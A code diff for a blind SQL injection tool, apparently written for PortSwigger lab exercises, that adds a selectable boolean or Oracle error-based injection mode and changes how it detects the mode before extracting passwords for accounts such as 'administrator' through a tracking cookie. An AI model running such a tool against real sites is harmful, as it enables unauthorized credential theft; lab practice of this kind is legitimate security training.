@@ -40,7 +40,7 @@ def banner():
     [+] Creator   : M Haidar                            
     [+] LinkedIn  : https://www.linkedin.com/in/haidarobs            
     [+] GitHub    : https://github.com/mdhaidarobs                    
-    [+] Version   : 3.5 (Session Cookie Fixed)
+    [+] Version   : 3.6 (Final PortSwigger Fix)
     ====================================================================
 {Style.RESET_ALL}
     """)
@@ -60,6 +60,7 @@ def get_user_input_interactive():
     parser.add_argument("-t", "--tracking", default="182--")
     parser.add_argument("-c", "--cookie", default="TrackingId")
     parser.add_argument("-sc", "--session", default=None)
+    parser.add_argument("-m", "--mode", type=int, default=None)
     parser.add_argument("-usr", "--users", default="administrator")
     parser.add_argument("-l", "--length", type=int, default=None)
     parser.add_argument("-p", "--proxy", default=None)
@@ -73,14 +74,14 @@ def get_user_input_interactive():
     print(f"\n{Fore.YELLOW}[*] Interactive Mode Enabled. Provide configuration details below:{Style.RESET_ALL}\n")
 
     while True:
-        url = input(f"{Fore.CYAN}Enter Target Lab URL (e.g., https://example.com/): {Style.RESET_ALL}").strip()
+        url = input(f"{Fore.CYAN}Enter Target Lab URL (e.g., https://example.com/filter?category=Gifts): {Style.RESET_ALL}").strip()
         if url.startswith("http"):
             args.url = url
             break
         log_error("URL must start with http:// or https://. Try again.")
 
     while True:
-        tracking_id = input(f"{Fore.CYAN}Enter your Base Tracking ID value [Default: 182--]: {Style.RESET_ALL}").strip()
+        tracking_id = input(f"{Fore.CYAN}Enter your Base Tracking ID value: {Style.RESET_ALL}").strip()
         if tracking_id:
             args.tracking = tracking_id
             break
@@ -90,9 +91,16 @@ def get_user_input_interactive():
     if cookie_name:
         args.cookie = cookie_name
 
-    session_cookie = input(f"{Fore.CYAN}Enter Session Cookie value (if required): {Style.RESET_ALL}").strip()
+    session_cookie = input(f"{Fore.CYAN}Enter Session Cookie value: {Style.RESET_ALL}").strip()
     if session_cookie:
         args.session = session_cookie
+
+    mode_input = input(f"{Fore.CYAN}Enter Injection Mode (1 for Boolean, 2 for Error-based) or leave blank for auto: {Style.RESET_ALL}").strip()
+    if mode_input:
+        try:
+            args.mode = int(mode_input)
+        except ValueError:
+            pass
 
     users_input = input(f"{Fore.CYAN}Enter Username(s) to target (comma separated) [Default: administrator]: {Style.RESET_ALL}").strip()
     if users_input:
@@ -124,6 +132,7 @@ class BlindSQLiEngine:
         self.base_id = args.tracking
         self.cookie_name = args.cookie
         self.session_cookie = args.session
+        self.active_mode = args.mode
         self.target_users = [u.strip() for u in args.users.split(',')]
         self.max_length = args.length
         self.use_special = args.special
@@ -147,8 +156,6 @@ class BlindSQLiEngine:
         adapter = requests.adapters.HTTPAdapter(max_retries=3)
         self.session.mount('http://', adapter)
         self.session.mount('https://', adapter)
-        
-        self.active_mode = None
 
     def _build_payload_mode1(self, user, position, char):
         if char is None:
@@ -208,8 +215,8 @@ class BlindSQLiEngine:
             log_info("Successfully detected Mode 2 (Oracle Error/Case-Based)")
             return 2
             
-        log_warn("Could not auto-detect mode definitively. Defaulting to Mode 1.")
-        return 1
+        log_warn("Could not auto-detect mode definitively. Defaulting to Mode 2.")
+        return 2
 
     def _detect_length(self, user):
         log_info(f"Detecting password length for '{user}'...")
@@ -271,11 +278,12 @@ class BlindSQLiEngine:
     def extract_password(self, user):
         log_info(f"Starting extraction for user: {Fore.CYAN}{user}{Style.RESET_ALL}")
         
+        if not self.active_mode:
+            self.active_mode = self._detect_mode(user)
+
         if self.max_length:
             length = self.max_length
             log_info(f"Using provided length: {length}")
-            if not self.active_mode:
-                self.active_mode = self._detect_mode(user)
         else:
             length = self._detect_length(user)
             if not length:
@@ -333,6 +341,7 @@ def main():
         parser.add_argument("-t", "--tracking", default="182--", help="Base Tracking ID")
         parser.add_argument("-c", "--cookie", default="TrackingId", help="Cookie name")
         parser.add_argument("-sc", "--session", default=None, help="Session cookie value")
+        parser.add_argument("-m", "--mode", type=int, default=None, help="Injection mode (1 or 2)")
         parser.add_argument("-usr", "--users", default="administrator", help="Usernames")
         parser.add_argument("-l", "--length", type=int, default=None, help="Password length")
         parser.add_argument("-p", "--proxy", help="Proxy URL")
